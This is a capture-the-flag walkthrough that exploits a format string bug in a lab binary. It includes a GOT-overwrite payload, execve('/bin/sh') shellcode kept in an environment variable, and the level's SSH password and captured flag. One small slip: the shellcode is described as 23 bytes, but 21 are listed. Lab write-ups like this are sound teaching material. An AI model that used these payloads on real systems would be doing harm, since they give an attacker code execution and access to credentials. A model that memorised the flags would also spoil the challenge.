# Walkthrough

## 1. Download the binary

```bash
scp -P 2222 level05@localhost:~/level05 .
# Password: 3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```

## 2. Analyze with Ghidra

Open the binary in Ghidra and examine the `main` function.

## 3. Understand the program flow

**Program behavior:**
1. Reads 100 bytes from stdin via `fgets()`
2. Loops through each character
3. If character is uppercase (`'A'-'Z'` / `0x41-0x5A`), XORs with `0x20` to convert to lowercase
4. Passes buffer directly to `printf()` - **FORMAT STRING VULNERABILITY**
5. Calls `exit(0)`

## 4. Identify the vulnerability

**Format string vulnerability:**
- `printf(buffer)` without format specifier
- Allows reading/writing arbitrary memory via `%p`, `%n`, etc.

**Character transformation challenge:**
- Uppercase bytes (`0x41-0x5A`) → lowercase (`0x61-0x7A`)
- Traditional shellcode contains uppercase bytes that get corrupted
- Example: `0x52` ('R') becomes `0x72` ('r')

## 5. Find buffer position on stack

Use the marker technique to find where our buffer is positioned:

```bash
ssh level05@localhost -p 2222
# Password: 3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN

echo 'AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.' | ./level05
```

**Output:**
```
aaaa64.f7fcfac0.0.0.0.0.ffffffff.ffffdc94.f7fdb000.61616161.
                                                     ^^^^^^^^
                                                     Position 10!
```

**Analysis:**
- `AAAA` (0x41414141) gets converted to `aaaa` (0x61616161) by the uppercase filter
- The hex value `61616161` appears at the 10th `%x` output
- Our buffer starts at **stack position 10**

## 6. Verify multiple consecutive positions

```bash
echo 'AAAABBBBCCCCDDDD%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.' | ./level05
```

**Output:**
```
aaaabbbbccccdddd64.f7fcfac0.0.0.0.0.ffffffff.ffffdc94.f7fdb000.61616161.62626262.63636363.64646464.
                                                                 ^^^^^^^^ ^^^^^^^^ ^^^^^^^^ ^^^^^^^^
                                                                 Pos 10   Pos 11   Pos 12   Pos 13
```

Confirms:
- Position 10: bytes 0-3 of buffer
- Position 11: bytes 4-7 of buffer
- Position 12: bytes 8-11 of buffer
- Position 13: bytes 12-15 of buffer

## 7. Find GOT addresses

Use objdump to find the exit function's GOT entry:

```bash
objdump -R level05 | grep exit
```

**Output:**
```
080497e0 R_386_JUMP_SLOT   exit
```

**Target address:** `exit@GOT` = `0x080497e0`

We'll overwrite this address to redirect execution when `exit()` is called.

## 8. Create shellcode in environment variable

Since shellcode in the buffer gets corrupted by uppercase conversion, store it in an environment variable:

```bash
export SHELLCODE=$(python -c 'print "\x90"*200 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
```

**Shellcode breakdown:**
- 200 NOPs (`\x90`) - NOP sled for reliability
- 23 bytes of shellcode - `execve("/bin/sh", NULL, NULL)`

## 9. Find shellcode address in memory

```bash
gdb ./level05
(gdb) break main
(gdb) run
(gdb) x/500s environ
```

Look for the `SHELLCODE=` string and note the address. From testing:
- Environment variable starts at: `0xffffdd28`
- Shellcode (after NOPs) at: `0xffffddf0`

**Address verification:**
- `0xff` ✅ Safe (not in uppercase range)
- `0xdd` ✅ Safe
- `0xf0` ✅ Safe

## 10. Calculate format string payload

**Goal:** Overwrite `exit@GOT` (`0x080497e0`) with shellcode address (`0xffffddf0`)

**Using short writes (`%hn` - 2 bytes at a time):**

Write to two addresses:
- `0x080497e0` ← write `0xddf0` (56816 decimal)
- `0x080497e2` ← write `0xffff` (65535 decimal)

**Payload structure:**
```
[addr1: 4 bytes][addr2: 4 bytes][padding][%10$hn][padding][%11$hn]
```

**Calculation:**
- Addresses: 8 bytes
- Need to print 56816 total bytes: `56816 - 8 = 56808`
- Then write to position 10 (first address)
- Need to print 65535 total bytes: `65535 - 56816 = 8719`
- Then write to position 11 (second address)

## 11. Construct the exploit

```python
import struct

payload = struct.pack("<I", 0x080497e0)    # exit@GOT
payload += struct.pack("<I", 0x080497e2)   # exit@GOT+2
payload += "%56808x"                       # Pad to 56816 bytes
payload += "%10$hn"                        # Write 0xddf0 to exit@GOT
payload += "%8719x"                        # Pad to 65535 bytes
payload += "%11$hn"                        # Write 0xffff to exit@GOT+2
```

## 12. Execute the exploit

```bash
# Set environment variable
export SHELLCODE=$(python -c 'print "\x90"*200 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')

# Run exploit
(python -c 'import struct; print struct.pack("<I", 0x080497e0) + struct.pack("<I", 0x080497e2) + "%56808x%10$hn%8719x%11$hn"'; cat) | ./level05
```

**Output:**
```
[lots of padding output]
whoami
level06
cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```

## 13. Flag

```
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```
